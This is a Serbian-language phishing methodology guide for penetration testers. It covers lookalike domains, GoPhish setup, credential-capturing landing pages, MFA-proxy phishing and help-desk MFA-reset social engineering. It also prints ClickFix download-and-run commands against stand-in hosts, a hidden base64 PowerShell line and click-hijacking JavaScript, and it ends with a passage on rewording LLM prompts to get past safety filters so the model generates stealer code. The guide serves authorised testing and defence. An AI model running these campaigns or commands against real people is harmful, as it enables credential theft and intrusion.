# Metodologija phishinga

## Metodologija

1. Izvršite izviđanje žrtve
1. Izaberite **domen žrtve**.
2. Izvršite osnovnu web enumeraciju **tražeći login portale** koje žrtva koristi i **odlučite** koji ćete **oponašati**.
3. Upotrebite **OSINT** da **pronađete email adrese**.
2. Pripremite okruženje
1. **Kupite domen** koji ćete koristiti za phishing procenu
2. **Konfigurišite zapise povezane sa email servisom** (SPF, DMARC, DKIM, rDNS)
3. Konfigurišite VPS sa **gophish**
3. Pripremite kampanju
1. Pripremite **email template**
2. Pripremite **web stranicu** za krađu kredencijala
4. Pokrenite kampanju!

## Generisanje sličnih imena domena ili kupovina pouzdanog domena

### Tehnike variranja imena domena

- **Ključna reč**: Ime domena **sadrži** važnu **ključnu reč** originalnog domena (npr., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Poddomen sa crticom**: Zamenite **tačku crticom** u poddomenu (npr., www-zelster.com).
- **Novi TLD**: Isti domen uz korišćenje **novog TLD-a** (npr., zelster.org)
- **Homoglif**: **Zamenjuje** slovo u imenu domena **slovima koja izgledaju slično** (npr., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transpozicija:** **Zamenjuje mesta dvama slovima** unutar imena domena (npr., zelsetr.com).
- **Singularizacija/Pluralizacija**: Dodaje ili uklanja „s“ na kraju imena domena (npr., zeltsers.com).
- **Izostavljanje**: **Uklanja jedno** od slova iz imena domena (npr., zelser.com).
- **Ponavljanje:** **Ponavlja jedno** od slova u imenu domena (npr., zeltsser.com).
- **Zamena**: Kao homoglif, ali manje prikriveno. Zamenjuje jedno od slova u imenu domena, možda slovom koje je blizu originalnog slova na tastaturi (npr., zektser.com).
- **Dodavanje poddomena**: Uvodi **tačku** unutar imena domena (npr., ze.lster.com).
- **Umetanje**: **Umeće slovo** u ime domena (npr., zerltser.com).
- **Nedostajuća tačka**: Dodaje TLD na ime domena. (npr., zelstercom.com)

**Automatski alati**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Web sajtovi**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da se neki bitovi koji su uskladišteni ili se prenose automatski promene** usled različitih faktora, kao što su solarne baklje, kosmički zraci ili hardverske greške.

Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji primi DNS server** ne bude isti kao domen koji je prvobitno zatražen.

Na primer, izmena jednog bita u domenu „windows.com“ može ga promeniti u „windnws.com“.

Napadači mogu **iskoristiti ovo registrovanjem više domena sa promenjenim bitovima** koji su slični domenu žrtve. Njihova namera je da legitimne korisnike preusmere na sopstvenu infrastrukturu.

Za više informacija pročitajte [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Kupovina pouzdanog domena

Na [https://www.expireddomains.net/](https://www.expireddomains.net) možete potražiti domen sa isteklom registracijom koji biste mogli da koristite.\
Da biste se uverili da domen sa isteklom registracijom koji nameravate da kupite **već ima dobar SEO**, možete proveriti kako je kategorizovan na:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Pronalaženje email adresa

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% besplatno)
- [https://phonebook.cz/](https://phonebook.cz) (100% besplatno)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da biste **pronašli više** važećih email adresa ili **proverili one** koje ste već pronašli, možete proveriti da li možete izvršiti brute-force nad SMTP serverima žrtve. [Saznajte kako da verifikujete/pronađete email adresu ovde](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Pored toga, ne zaboravite da, ako korisnici koriste **bilo koji web portal za pristup email porukama**, možete proveriti da li je ranjiv na **username brute force** i iskoristiti ranjivost ako je moguće.

## Konfigurisanje GoPhish

### Instalacija

Možete ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmite ga, dekompresujte unutar `/opt/gophish` i izvršite `/opt/gophish/gophish`\
U izlazu ćete dobiti lozinku za admin korisnika na portu 3333. Zato pristupite tom portu i upotrebite te kredencijale da promenite admin lozinku. Možda ćete morati da tunelujete taj port na lokalni:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracija

**Konfiguracija TLS sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i on mora biti **usmeren** na **IP adresu VPS-a** na kojem konfigurišete **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracija e-pošte**

Započnite instalaciju: `apt-get install postfix`

Zatim dodajte domen u sledeće datoteke:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Takođe promenite vrednosti sledećih promenljivih u datoteci /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmenite datoteke **`/etc/hostname`** i **`/etc/mailname`** tako da sadrže naziv vašeg domena i **restartujte VPS.**

Sada kreirajte **DNS A record** za `mail.<domain>` koji pokazuje na **IP adresu** VPS-a i **DNS MX** record koji pokazuje na `mail.<domain>`.

Sada testirajmo slanje e-pošte:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish konfiguracija**

Zaustavite izvršavanje gophish-a i konfigurišimo ga.\
Izmenite `/opt/gophish/config.json` na sledeći način (obratite pažnju na korišćenje https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigurišite gophish service**

Da biste kreirali gophish service tako da može automatski da se pokreće i da se njime upravlja kao service, možete kreirati fajl `/etc/init.d/gophish` sa sledećim sadržajem:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Završite konfigurisanje servisa i proverite ga tako što ćete:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurisanje mail servera i domena

### Sačekajte i budite legitimni

Što je domen stariji, manja je verovatnoća da će biti označen kao spam. Zato bi trebalo da sačekate što je moguće duže (najmanje 1 nedelju) pre phishing procene. Osim toga, ako postavite stranicu o sektoru sa dobrom reputacijom, stečena reputacija će biti bolja.

Imajte na umu da, čak i ako morate da sačekate nedelju dana, sve možete da konfigurišete već sada.

### Konfigurisanje Reverse DNS (rDNS) zapisa

Podesite rDNS (PTR) zapis koji IP adresu VPS-a razrešava u naziv domena.

### Sender Policy Framework (SPF) zapis

Morate **konfigurisati SPF zapis za novi domen**. Ako ne znate šta je SPF zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možete koristiti [https://www.spfwizard.net/](https://www.spfwizard.net) da generišete svoju SPF policy (koristite IP adresu VPS mašine).

![SPF Wizard forma za generisanje SPF zapisa za phishing domen](<../../images/image (1037).png>)

Ovo je sadržaj koji mora biti postavljen unutar TXT zapisa u domenu:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Zapis Domain-based Message Authentication, Reporting & Conformance (DMARC)

Morate **konfigurisati DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate kreirati novi DNS TXT zapis koji pokazuje na hostname `_dmarc.<domain>`, sa sledećim sadržajem:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Morate **podesiti DKIM za novi domen**. Ako ne znate šta je DMARC record, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ovaj tutorijal je zasnovan na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Potrebno je da spojite obe B64 vrednosti koje DKIM ključ generiše:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testirajte ocenu konfiguracije emaila

To možete uraditi pomoću [https://www.mail-tester.com/](https://www.mail-tester.com)\
Samo otvorite stranicu i pošaljite email na adresu koju vam navedu:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Možete takođe **proveriti konfiguraciju emaila** slanjem emaila na `check-auth@verifier.port25.com` i **čitanjem odgovora** (za ovo ćete morati da **otvorite** port **25** i pogledate odgovor u datoteci _/var/mail/root_ ako email pošaljete kao root).\
Proverite da li prolazite sve testove:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Takođe možete poslati **poruku na Gmail nalog pod vašom kontrolom** i proveriti **zaglavlja emaila** u Gmail prijemnom sandučetu; `dkim=pass` treba da bude prisutno u polju zaglavlja `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Uklanjanje sa Spamhouse crne liste

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vas obavesti da li Spamhouse blokira vaš domen. Zahtev za uklanjanje domena/IP adrese možete podneti na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft crne liste

​​Zahtev za uklanjanje domena/IP adrese možete podneti na [https://sender.office.com/](https://sender.office.com).

## Kreiranje i pokretanje GoPhish Campaign

### Sending Profile

- Postavite neko **ime za identifikaciju** sender profila
- Odlučite sa kog naloga ćete slati phishing emailove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Polja za korisničko ime i lozinku možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors

![Kreiranje i pokretanje GoPhish Campaign - Sending Profile: Polja za korisničko ime i lozinku možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se korišćenje funkcionalnosti "**Send Test Email**" kako biste proverili da sve funkcioniše.\
> Preporučujem da **test emailove šaljete na 10min mail adrese** kako biste izbegli stavljanje na crnu listu tokom testiranja.

### Email Template

- Postavite neko **ime za identifikaciju** template-a
- Zatim napišite **subject** (ništa neobično, samo nešto što biste očekivali da pročitate u običnom emailu)
- Proverite da li je označena opcija "**Add Tracking Image**"
- Napišite **email template** (možete koristiti promenljive kao u sledećem primeru):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Imajte na umu da se, **kako bi se povećala verodostojnost email-a**, preporučuje korišćenje nekog potpisa iz email-a klijenta. Predlozi:

- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor sadrži potpis.
- Pretražite **javne email adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im email i sačekajte odgovor.
- Pokušajte da kontaktirate **neki pronađeni validni** email i sačekajte odgovor.

![Sending Profile - Email Template: Pokušajte da kontaktirate neki pronađeni validni email i sačekajte odgovor](<../../images/image (80).png>)

> [!TIP]
> Email Template takođe omogućava **dodavanje fajlova za slanje**. Ako biste želeli i da ukradete NTLM izazove korišćenjem posebno napravljenih fajlova/dokumenata, [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Odredišna stranica

- Unesite **ime**
- **Napišite HTML kod** web stranice. Imajte na umu da možete **uvesti** web stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Postavite **preusmeravanje**

![Email Template - Landing Page: Označite Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da izmenite HTML kod stranice i obavite nekoliko testova lokalno (možda korišćenjem nekog Apache servera) **sve dok ne budete zadovoljni rezultatima.** Zatim unesite taj HTML kod u polje.\
> Imajte na umu da, ako treba da **koristite neke statičke resurse** za HTML (možda neke CSS i JS stranice), možete ih sačuvati u _**/opt/gophish/static/endpoint**_ i zatim im pristupiti preko _**/static/\<filename>**_

> [!TIP]
> Za preusmeravanje možete **preusmeriti korisnike na legitimnu glavnu web stranicu** žrtve ili ih, na primer, preusmeriti na _/static/migration.html_, dodati neki **točkić za učitavanje (**[**https://loading.io/**](https://loading.io)**) u trajanju od 5 sekundi i zatim prikazati da je proces uspešno završen**.

### Korisnici i grupe

- Postavite ime
- **Uvezite podatke** (imajte na umu da su, kako biste koristili template za primer, potrebni ime, prezime i email adresa svakog korisnika)

![Landing Page - Users & Groups: Uvezite podatke (imajte na umu da su, kako biste koristili template za primer, potrebni ime, prezime i email adresa svakog korisnika)](<../../images/image (163).png>)

### Campaign

Na kraju, kreirajte campaign tako što ćete izabrati ime, email template, landing page, URL, sending profile i grupu. Imajte na umu da će URL biti link koji se šalje žrtvama.

Imajte na umu da **Sending Profile omogućava slanje testnog email-a kako biste videli kako će izgledati konačni phishing email**:

![Users & Groups - Campaign: Imajte na umu da Sending Profile omogućava slanje testnog email-a kako biste videli kako će izgledati konačni phishing email](<../../images/image (192).png>)

Kada sve bude spremno, samo pokrenite campaign!

## Kloniranje web stranice

Ako iz bilo kog razloga želite da klonirate web stranicu, pogledajte sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenti i fajlovi sa backdoor-om

U nekim phishing procenama (uglavnom za Red Teams) želećete da **pošaljete i fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili samo nešto što će pokrenuti autentifikaciju).\
Pogledajte sledeću stranicu za neke primere:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Putem Proxy MitM-a

Prethodni napad je prilično domišljat jer se predstavlja kao prava web stranica i prikuplja informacije koje korisnik unese. Nažalost, ako korisnik nije uneo ispravnu lozinku ili ako je aplikacija koju ste lažirali konfigurisana sa 2FA, **ove informacije vam neće omogućiti da se predstavljate kao prevareni korisnik**.

Tu su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat omogućava kreiranje napada nalik MitM napadu. Napad se u osnovi odvija na sledeći način:

1. **Predstavljate se kao login** forma prave web stranice.
2. Korisnik **šalje** svoje **credentials** na vašu lažnu stranicu, a alat ih šalje pravoj web stranici, **proveravajući da li credentials funkcionišu**.
3. Ako je nalog konfigurisan sa **2FA**, MitM stranica će zatražiti 2FA, a kada ga **korisnik unese**, alat će ga poslati pravoj web stranici.
4. Kada se korisnik autentifikuje, vi ćete (kao napadač) imati **uhvaćene credentials, 2FA, cookie i sve informacije** iz svake interakcije tokom obavljanja MitM napada.

### Putem VNC-a

Šta ako, umesto da **pošaljete žrtvu na zlonamernu stranicu** koja izgleda isto kao originalna, pošaljete žrtvu na **VNC sesiju sa browserom povezanim sa pravom web stranicom**? Moći ćete da vidite šta korisnik radi, ukradete lozinku, korišćeni MFA, cookie-je...\
To možete uraditi pomoću [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Otkrivanje detekcije

Očigledno je jedan od najboljih načina da saznate da li ste otkriveni da **pretražite svoj domen u blacklistama**. Ako se pojavljuje na listi, to na neki način znači da je vaš domen detektovan kao sumnjiv.\
Jedan jednostavan način da proverite da li se vaš domen pojavljuje u nekoj blacklisti jeste korišćenje [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjivu phishing aktivnost u okruženju**, kao što je objašnjeno na stranici:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domen sa veoma sličnim imenom** kao domen žrtve **i/ili generisati sertifikat** za **subdomain** domena koji kontrolišete, a koji **sadrži** **keyword** domena žrtve. Ako **žrtva** obavi bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma prikriveni.<sup>[[2]](#references)</sup>

### Procena phishing-a

Koristite [**Phishious** ](https://github.com/Rices/Phishious)da procenite da li će vaš email završiti u spam folderu, biti blokiran ili uspešno isporučen.

## Kompromitovanje identiteta direktnim kontaktom (Help-Desk MFA resetovanje)

Moderni intrusion set-ovi sve češće u potpunosti preskaču email mamce i **direktno ciljaju workflow servisnog deska / oporavka identiteta** kako bi zaobišli MFA. Napad se u potpunosti oslanja na postojeće resurse sistema: kada operator preuzme validne credentials, kreće se dalje pomoću ugrađenih admin alata – malware nije potreban.<sup>[[6]](#references)</sup>

### Tok napada
1. Prikupljanje informacija o žrtvi
* Prikupite lične i poslovne podatke sa LinkedIn-a, iz data breach-eva, javnog GitHub-a itd.
* Identifikujte identitete visoke vrednosti (rukovodioce, IT, finansije) i utvrdite **tačan help-desk proces** za resetovanje lozinke / MFA-a.
2. Socijalni inženjering u realnom vremenu
* Pozovite help-desk telefonom, preko Teams-a ili chat-a, predstavljajući se kao meta (često uz **spoofed caller-ID** ili **kloniran glas**).
* Dostavite prethodno prikupljene PII podatke kako biste prošli verifikaciju zasnovanu na znanju.
* Ubedite agenta da **resetuje MFA secret** ili izvrši **SIM-swap** registrovanog mobilnog broja.
3. Neposredne aktivnosti nakon pristupa (≤60 min u stvarnim slučajevima)
* Uspostavite foothold kroz bilo koji web SSO portal.
* Enumerišite AD / AzureAD pomoću ugrađenih alata (bez ubacivanja binarnih fajlova):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Izvršite lateralno kretanje pomoću **WMI**, **PsExec** ili legitimnih **RMM** agenata koji su već na whitelist-i u okruženju.

### Detekcija i ublažavanje
* Tretirajte oporavak identiteta putem help-desk-a kao **privilegovanu operaciju** – zahtevajte step-up auth i odobrenje menadžera.
* Uvedite pravila **Identity Threat Detection & Response (ITDR)** / **UEBA** koja generišu upozorenja za:
* Promenjen MFA metod + autentifikacija sa novog uređaja / geo-lokacije.
* Neposredno podizanje privilegija istog principala (user-→-admin).
* Snimajte help-desk pozive i zahtevajte **callback na već registrovani broj** pre bilo kakvog resetovanja.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** kako novo-resetovani nalozi ne bi automatski nasledili tokene visokih privilegija.

---

## Obmana u velikom obimu – SEO Poisoning i „ClickFix“ kampanje
Commodity grupe nadoknađuju troškove operacija sa direktnim kontaktom masovnim napadima koji **pretvaraju search engine-e i ad networks u kanal za isporuku**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** postavlja lažni rezultat, kao što je `chromium-update[.]site`, na vrh search oglasa.
2. Žrtva preuzima mali **first-stage loader** (često JS/HTA/ISO). Primeri koje je zabeležio Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader izvlači browser cookie-je i credential DB-ove, zatim preuzima **silent loader** koji u realnom vremenu odlučuje da li da postavi:
* RAT (npr. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence komponentu (registry Run key + scheduled task)

### Saveti za hardening
* Blokirajte novo registrovane domene i primenite **Advanced DNS / URL Filtering** i na *search-ads*, kao i na email.
* Ograničite instalaciju software-a na potpisane MSI / Store pakete; pravilima zabranite izvršavanje `HTA`, `ISO`, `VBS` fajlova.
* Pratite child procese browsera koji otvaraju installere:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Pretražujte LOLBins koje first-stage loader-i često zloupotrebljavaju (npr. `regsvr32`, `curl`, `mshta`).

### Hijacking klika na dugme za preuzimanje uz TDS handoff
Neki lažni software portali ostavljaju vidljivi download `href` koji pokazuje na **stvarni GitHub/release URL**, ali pomoću JavaScript-a preotimaju **prvu** interakciju korisnika i umesto toga šalju žrtvu u lanac **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ključne karakteristike:
- Hook se obično izvršava u **capture fazi** (`true`) na objektu `document`, tako da se aktivira pre handlera samog sajta.
- Chrome često koristi `mousedown` umesto `click` kako bi preusmeravanje ostalo povezano sa važećom **user gesture** radnjom i poboljšao zaobilaženje blokatora iskačućih prozora.
- Neke varijante unapred otvaraju `about:blank` ili simuliraju klikove na `<a target="_blank">`, a URL ka TDS-u dodeljuju tek kasnije.
- Ograničenja na strani browsera često se čuvaju u `localStorage`, pa **prvi klik** može dovesti do malware-a, dok se osvežavanja/ponovni pokušaji vraćaju na bezazleno delujući vidljivi link.
- TDS može vršiti filtriranje prema referreru, ulaznom domenu, GEO lokaciji, fingerprintu browsera/uređaja, proverama VPN/datacentar opsega, kontekstu klika i brojačima po sesiji, zbog čega replay analitičara nije deterministički.

Ideje za odbranu:
- Uporedite **prikazani** `href` sa **stvarnim** odredištem navigacije generisanim u trenutku klika.
- Tražite handlere `document.addEventListener(..., true)` koji pozivaju i `preventDefault()` i `stopImmediatePropagation()` u blizini `window.open`, `about:blank` ili simuliranih klikova na anchor elemente.
- Tretirajte grupe novoregistrovanih domena za preuzimanje softvera koji svi učitavaju isti CloudFront/JS stage kao obrazac SEO poisoning/TDS sa visokim signalom.

### ClickFix sa lažnih stranica za verifikaciju + LOLBAS fetch-ovi koji izgledaju kao arhive
Neke TDS grane završavaju na lažnoj stranici za verifikaciju (u stilu Cloudflare/IUAM) koja žrtvi nalaže da pokrene pouzdani Windows binarni fajl, kao što je:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Napomene:
- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako se URL predstavlja kao `.7z` arhiva; dodatni arhivski podaci mogu biti čista obmana.
- Naredne faze često nastavljaju da obmanjuju u vezi sa tipom datoteke (`.rtf` za PowerShell, `.asar` za Python, ZIP arhive sa binarnim datotekama dopunjenim paddingom), a zatim prelaze na **ručno PE mapiranje / izvršavanje u memoriji**.
- Ako odgovarate na jedan od ovih lanaca, sačuvajte **mrežu + memoriju od prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo bezopasnu putanju instalera/SFX-a ili neuspeti zato što su oslobađanje payload-a/ključa bili vezani za originalnu TDS sesiju.

### ClickFix DLL tradecraft (lažno CERT ažuriranje)
* Mamac: klonirano upozorenje nacionalnog CERT-a sa dugmetom **Update** koje prikazuje detaljna uputstva za „popravku“. Žrtvama se govori da pokrenu batch koji preuzima DLL i izvršava ga pomoću `rundll32`.<sup>[[12]](#references)</sup>
* Uočeni tipični batch lanac:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` smešta payload u `%TEMP%`, kratko čekanje prikriva mrežno kašnjenje, a zatim `rundll32` poziva eksportovanu ulaznu tačku (`notepad`).
* DLL šalje identitet hosta i proverava C2 svakih nekoliko minuta. Udaljeni nalozi stižu kao **base64-enkodirani PowerShell**, izvršeni skriveno i uz zaobilaženje policy-ja:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Ovo zadržava fleksibilnost C2-a (server može da menja task-ove bez ažuriranja DLL-a) i skriva prozore konzole. Tražite PowerShell procese-podprocese `rundll32.exe` koji koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` zajedno.
* Defenders mogu da traže HTTP(S) callback-ove oblika `...page.php?tynor=<COMPUTER>sss<USER>` i intervale provere od 5 minuta nakon učitavanja DLL-a.

---

## Phishing operacije unapređene pomoću AI-ja
Napadači sada kombinuju **LLM i voice-clone API-je** za potpuno personalizovane mamce i interakciju u realnom vremenu.

| Sloj | Primer upotrebe od strane threat actor-a |
|-------|---------------------------------------------|
|Automatizacija|Generisanje i slanje više od 100 hiljada emailova / SMS poruka sa nasumično izmenjenim tekstom i tracking linkovima.|
|Generative AI|Kreiranje *jednokratnih* emailova koji se pozivaju na javne M&A informacije i interne šale sa društvenih mreža; deep-fake glasa CEO-a u callback prevari.|
|Agentic AI|Autonomna registracija domena, prikupljanje open-source intelligence podataka i kreiranje emailova naredne faze kada žrtva klikne, ali ne pošalje kredencijale.|

**Odbrana:**
• Dodajte **dinamičke bannere** koji ističu poruke poslate iz nepouzdane automatizacije (na osnovu ARC/DKIM anomalija).
• Uvedite **voice-biometric challenge fraze** za telefonske zahteve visokog rizika.
• Kontinuirano simulirajte mamce generisane pomoću AI-ja u programima podizanja svesti – statični template-i su zastareli.

Pogledajte i – zloupotrebu agentic browsing-a za credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Pogledajte i – zloupotrebu AI agent-a za lokalne CLI alate i MCP (za inventarizaciju secrets podataka i detekciju):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly phishing JavaScript-a (generisanje koda u browseru)

Napadači mogu da isporuče HTML koji izgleda bezopasno i **generišu stealera tokom izvršavanja** tako što zatraže JavaScript od **trusted LLM API-ja**, a zatim ga izvrše u browseru (npr. pomoću `eval` ili dinamičkog `<script>` elementa).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** kodirajte URL-ove za eksfiltraciju/Base64 stringove u promptu; menjajte formulaciju da biste zaobišli safety filtere i smanjili hallucinations.
2. **Client-side API call:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/itd.) ili CDN proxy; u statičkom HTML-u prisutni su samo prompt/API poziv.
